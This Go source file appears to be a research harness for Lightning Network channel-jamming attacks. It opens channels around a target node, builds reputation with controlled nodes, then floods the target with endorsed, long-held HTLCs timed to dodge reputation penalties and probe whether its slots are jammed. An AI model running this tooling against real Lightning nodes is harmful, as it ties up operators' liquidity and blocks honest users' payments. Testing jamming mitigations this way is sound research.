package main

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/lightninglabs/lndclient"
	"github.com/lightningnetwork/lnd/funding"
	"github.com/lightningnetwork/lnd/lnrpc"
	"github.com/lightningnetwork/lnd/lnwire"
	"github.com/lightningnetwork/lnd/routing/route"
)

type ReputationHarness struct {
	LndNodes Nodes

	graph  *GraphHarness
	jammer *JammingHarness
}

// OpenChannels opens a set of channels that can be used to build reputation
// with a target node for use over its channel with the target peer provided.
// This function assumes that the target and its peers are directly connected
// with *one* channel.
//
// Given: Target --- Peer
//
// This function will open channels as follows:
//
//	   LND0 (builds and abuses reputation)
//		|
//
//	   Target --- Peer --- LND1 (used to probe endorsement)
//
//		|
//	    LND2 (maintains good reputation)
func (r *ReputationHarness) OpenChannels(ctx context.Context, targetNode,
	targetPeer route.Vertex) error {

	chanCap := funding.MaxBtcFundingAmount
	chan1, err := r.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      0,
		Dest:        targetNode,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return fmt.Errorf("LND-0 -> target: %v", err)
	}

	fmt.Printf("Opened channel with target node (%s) from LND-0\n",
		targetNode)

	// With attack node 1, open a channel with the targets peer & push a
	// large amount to them.
	chan2, err := r.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      1,
		Dest:        targetPeer,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return fmt.Errorf("LND-1 -> target peer: %v", err)
	}
	fmt.Printf("Opened channel with target peer (%s) from LND-1\n",
		targetPeer)

	// Open chan from a2 to target (a2 is our "good" node). We will build
	// good rep for it and maintain that good rep. If its payments stop
	// going through then we know we have jammed the target channel.
	chan3, err := r.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      2,
		Dest:        targetNode,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return fmt.Errorf("LND-2 -> target: %v", err)

	}

	fmt.Printf("Opened channel with target node (%s) from LND-2\n",
		targetNode)

	// Wait for channels to reflect in graphs.
	fmt.Println("Waiting for channels to reflect in graphs")
	r.graph.WaitForChannel(ctx, 1, 0, chan1)
	r.graph.WaitForChannel(ctx, 2, 0, chan1)

	r.graph.WaitForChannel(ctx, 0, 1, chan2)
	r.graph.WaitForChannel(ctx, 2, 1, chan2)

	r.graph.WaitForChannel(ctx, 0, 2, chan3)
	r.graph.WaitForChannel(ctx, 1, 2, chan3)

	return nil
}

// ProbeOutcome summarizes the outcome from an attempt to probe a targeted node
// with endorsed HTLCs.
type ProbeOutcome struct {
	// Timeout is true if we could not dispatch and handle our probes
	// within the 60 seconds we have to send a payment without putting
	// our reputation at risk.
	Timeout bool

	// SenderDispatched is the number of payments we managed to dispatch.
	SenderDispatched int

	// ReceiverResolved is the number of payments that reached the
	// receiving node and were settled back.
	ReceiverResolved int

	// EndorsedCount is the number of HTLCs that were endorsed when they
	// reached the sender.
	EndorsedCount int
}

// ProbeEndorsedCount will send a set of endorsed payments over the topology
// described in OpenChannels to determine the number of endorsed HTLCs that the
// sending node's reputation currently allows.
func (r *ReputationHarness) ProbeEndorsedCount(ctx context.Context,
	src int) (*ProbeOutcome, error) {

	var (
		respChans   []<-chan JammingPaymentResp
		earlySettle = make(chan struct{})
	)

	// Add a best effort attempt to close our earlySettle channel when we
	// exit and have *not* already canceled our HTLCs back (this will
	// happen on error-out mostly). This makes it easier for us to close
	// our channels out.
	defer func() {
		select {
		case <-earlySettle:
		default:
			close(earlySettle)
		}
	}()

	// We want to save ourselves the expense of pathfinding, and make sure
	// that we're actually going through the target node so we get one
	// route for our probes and stick to it.
	//
	// Note: we do not have our MPP record's value at this point, as it's
	// obtained from the invoice (and the QueryRoutes api doesn't allow
	// use to set it, even if we did have it), so all we get here is a
	// route that needs to be updated for the invoice it'll eventually pay.
	//
	// TODO: pick this amount better?
	amt_msat := lnwire.MilliSatoshi(500_000)
	route, err := r.LndNodes.GetNode(src).Client.QueryRoutes(
		ctx,
		lndclient.QueryRoutesRequest{
			PubKey:       r.LndNodes.GetNode(1).NodePubkey,
			AmtMsat:      amt_msat,
			FeeLimitMsat: lnwire.MaxMilliSatoshi,
		},
	)
	if err != nil {
		return nil, err
	}
	// TODO: ensure that this goes through target node

	// Dispatch enough payments to fill up all of the target's general
	// slots. We don't want to lose reputation doing this, so we set our
	// cutoff to be in 75 seconds (well south of the 90 seconds that we
	// lose reputation at).
	outcome := &ProbeOutcome{
		Timeout: false,
	}
	cutoff := time.Now().Add(time.Second * 75)
	for i := 0; i < 241; i++ {
		if time.Now().After(cutoff) {
			close(earlySettle)
			outcome.Timeout = true

			return outcome, nil
		}

		req := JammingPaymentReq{
			AmtMsat:         amt_msat,
			SourceIdx:       src,
			DestIdx:         1,
			EndorseOutgoing: true,
			Settle:          false,
			// Note: we set a long hold time but provide a single
			// channel to cancel all payments back at once. This
			// allows us to more granularly control payments to
			// make sure they're all in flight at the same time.
			SettleWait:  time.Hour,
			EarlySettle: earlySettle,
		}

		resp, err := r.jammer.JammingPaymentRoute(ctx, req, *route)
		if err != nil {
			return nil, err
		}

		outcome.SenderDispatched++
		respChans = append(respChans, resp)
	}

	// Wait for responses from all payments.
	remaining := cutoff.Sub(time.Now())

	fmt.Printf("Launched probes, %v remaining to settle %v payments\n",
		remaining, len(respChans))

	// We don't really care what order we resolve these in because we'll
	// cancel them all back if we run into time trouble so we can just
	// low-effort go payment-by-payment.
	//
	// TODO: if we run into timeouts then we'll need to parallelize this.
	for _, resp := range respChans {
		select {
		case pmtOutcome := <-resp:
			if pmtOutcome.Err != nil {
				return nil, pmtOutcome.Err
			}

			// If the payment failed, we couldn't dispatch it
			// successfully.
			if pmtOutcome.SendFailure !=
				lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
				outcome.SenderDispatched--
				continue
			}

			if len(pmtOutcome.Htlcs) != 0 {
				outcome.ReceiverResolved++
			}

			// If the HTLC was endorsed, then we add to our count.
			if outgoingEndorsed(pmtOutcome.Htlcs) {
				outcome.EndorsedCount++
			}

		// If we run out of time, settle everything back quickly and
		// report that we timed out. Still wait for all of our payments
		// to settle so that we can report on what happened and close
		// out our channels easily.
		case <-time.After(remaining):
			close(earlySettle)
			outcome.Timeout = true

		case <-ctx.Done():
			return nil, ctx.Err()
		}
	}

	return outcome, nil
}

// BuildReputation forwards a series of payments between a source and
// destination node to build reputation along the path. This is a blocking
// function that should be run in a goroutine.
func (r *ReputationHarness) BuildReputation(ctx context.Context, src,
	dst int) error {

	// Get current best block
	_, height, err := r.LndNodes.GetNode(src).ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	var (
		wg sync.WaitGroup

		// Send a max of 200 payments in parallel.
		semaphores = make(chan struct{}, 200)

		count, failures atomic.Uint64
	)

	fmt.Println("Build reputation starting: ", src, dst)
	defer func() {
		fmt.Println("Build reputation waiting for shutdown: ", src, dst)
		wg.Wait()
	}()

	for {
		if count.Load()%1000 == 0 && count.Load() != 0 {
			fmt.Printf("Dispatched %v->%v: %v payments, %v "+
				"failures\n", src, dst, count.Load(),
				failures.Load())
		}
		select {
		// Otherwise, report a new goroutine to our count.
		case semaphores <- struct{}{}:

		case <-ctx.Done():
			return ctx.Err()
		}

		// Dispatch payment and wait for result in goroutine.
		wg.Add(1)
		go func() {
			jamReq := JammingPaymentReq{
				AmtMsat:         80000,
				SourceIdx:       src,
				DestIdx:         dst,
				FinalCLTV:       uint64(height) + 80,
				EndorseOutgoing: false,
				Settle:          true,
				EarlySettle:     make(chan struct{}),
			}

			// Close the EarlySettle channel to make a best-effort
			// shot at canceling our htlcs on exit (when we hit an
			// error).
			defer func() {
				select {
				case <-jamReq.EarlySettle:
				default:
					close(jamReq.EarlySettle)
				}

				wg.Done()
			}()

			resp, err := r.jammer.JammingPayment(ctx, jamReq)
			if err != nil {
				return
			}
			count.Add(1)

			// Wait for a response from our payment so that we
			// know the HTLC is fully cleaned up by the time
			// we exit. Note that we *do not* listen on cancel
			// signals here - we expect JammingPayment to handle
			// this listening for us and exit accordingly.
			r := <-resp
			switch {
			case errors.Is(r.Err, context.Canceled):
				return

			case r.Err != nil:
				// Sometimes error is not wrapped, so
				// we have to string match as well.
				if strings.Contains(
					r.Err.Error(),
					"context canceled",
				) {
					return
				}

				fmt.Printf("error sending good "+
					"payment: %v\n", r.Err)

			case r.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE:
				failures.Add(1)
			}

			// Unblock the next payment if there is one,
			// otherwise just exit.
			select {
			case <-semaphores:
			default:
			}
		}()
	}
}

// outgoingEndorsed returns a boolean if any of the htlcs associated with a
// payment were endorsed when they reached the sender.
func outgoingEndorsed(htlcs []lndclient.InvoiceHtlc) bool {
	for _, htlc := range htlcs {
		if htlc.IncomingEndorsed {
			return true
		}
	}

	return false
}
